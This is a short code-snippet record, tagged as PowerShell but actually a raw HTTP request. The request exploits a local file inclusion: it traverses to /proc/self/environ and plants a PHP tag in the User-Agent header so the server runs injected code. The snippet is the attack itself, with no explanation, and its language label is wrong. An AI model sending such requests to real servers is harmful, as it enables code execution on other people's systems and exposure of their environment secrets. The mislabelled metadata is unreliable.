---
id: f7b96fc7-4711-4126-ac85-d8ee0a376fb6
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:55:58.456666+00:00'
updated_at: '2023-04-10T20:22:18.729885+00:00'
---

# Code Snippet f7b96fc7

**Language**: Powershell

```powershell
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
